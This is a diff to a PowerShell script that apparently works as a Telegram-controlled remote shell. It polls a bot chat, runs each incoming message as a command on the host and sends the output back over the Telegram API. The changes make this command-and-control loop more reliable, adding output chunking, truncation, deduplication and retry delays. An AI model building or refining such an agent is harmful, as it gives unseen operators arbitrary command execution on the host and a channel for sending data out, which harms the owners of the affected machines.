@@ -17,52 +17,127 @@ function Execute-Command {
     }
 }
 
-# Function to send message to Telegram
+# Function to send message to Telegram with chunking
 function Send-TelegramMessage {
     param (
         [string]$Message
     )
     try {
-        $uri = "$TELEGRAM_API/sendMessage"
-        $body = @{
-            chat_id = $CHAT_ID
-            text = $Message
-        } | ConvertTo-Json
-        Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $body | Out-Null
+        # Telegram message limit is 4096 characters
+        $maxLength = 4096
+        $messageLength = $Message.Length
+        
+        if ($messageLength -le $maxLength) {
+            # Message is within limits, send normally
+            $uri = "$TELEGRAM_API/sendMessage"
+            $body = @{
+                chat_id = $CHAT_ID
+                text = $Message
+            } | ConvertTo-Json
+            Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $body | Out-Null
+        }
+        else {
+            # Message is too long, split into chunks
+            Write-Host "Message too long ($messageLength chars), splitting into chunks..."
+            
+            # Split the message into chunks of 4000 characters (leaving room for headers)
+            $chunks = @()
+            for ($i = 0; $i -lt $messageLength; $i += 4000) {
+                $chunkLength = [Math]::Min(4000, $messageLength - $i)
+                $chunk = $Message.Substring($i, $chunkLength)
+                $chunks += $chunk
+            }
+            
+            # Send each chunk with numbering
+            for ($j = 0; $j -lt $chunks.Count; $j++) {
+                $chunkMessage = "[Part $($j+1)/$($chunks.Count)]`n$($chunks[$j])"
+                $uri = "$TELEGRAM_API/sendMessage"
+                $body = @{
+                    chat_id = $CHAT_ID
+                    text = $chunkMessage
+                } | ConvertTo-Json
+                Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $body | Out-Null
+                Start-Sleep -Milliseconds 500  # Avoid rate limiting
+            }
+        }
     }
     catch {
         Write-Error "Failed to send Telegram message: $_"
     }
 }
 
+# Function to truncate very long outputs
+function Limit-Output {
+    param (
+        [string]$Output,
+        [int]$MaxLength = 3500
+    )
+    if ($Output.Length -le $MaxLength) {
+        return $Output
+    }
+    else {
+        $truncated = $Output.Substring(0, $MaxLength)
+        return "$truncated`n`n[OUTPUT TRUNCATED - Original was $($Output.Length) characters]"
+    }
+}
+
 # Main loop to poll for new messages
 $offset = 0
+$processedMessages = @{}  # Track processed messages to avoid duplicates
+
 while ($true) {
     try {
         # Get updates from Telegram
-        $uri = "$TELEGRAM_API/getUpdates?offset=$offset"
+        $uri = "$TELEGRAM_API/getUpdates?offset=$offset&timeout=30"
         $updates = Invoke-RestMethod -Uri $uri -Method Get
 
         foreach ($update in $updates.result) {
+            $updateId = $update.update_id
+            $messageId = $update.message.message_id
+            
+            # Skip if we've already processed this message
+            if ($processedMessages.ContainsKey($messageId)) {
+                $offset = $updateId + 1
+                continue
+            }
+            
             if ($update.message -and $update.message.chat.id -eq $CHAT_ID) {
                 $command = $update.message.text
                 $message_id = $update.message.message_id
 
+                Write-Host "Executing command: $command"
+                
                 # Execute the command and get output
                 $output = Execute-Command -Command $command
-
+                
+                # Limit output length to avoid Telegram limits
+                $limitedOutput = Limit-Output -Output $output
+                
                 # Send the output back to Telegram
-                Send-TelegramMessage -Message "Command: $command`nOutput:`n$output"
+                Send-TelegramMessage -Message "Command: $command`nOutput:`n$limitedOutput"
 
+                # Mark message as processed
+                $processedMessages[$messageId] = $true
+                
+                # Clean up old processed messages to prevent memory growth
+                if ($processedMessages.Count -gt 1000) {
+                    $oldestKey = $processedMessages.Keys | Select-Object -First 500
+                    foreach ($key in $oldestKey) {
+                        $processedMessages.Remove($key)
+                    }
+                }
+                
                 # Update offset to mark message as processed
-                $offset = $update.update_id + 1
+                $offset = $updateId + 1
             }
         }
     }
     catch {
         Write-Error "Error in main loop: $_"
+        # Wait longer on error
+        Start-Sleep -Seconds 5
     }
 
     # Wait before polling again to avoid rate limits
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 1
 }
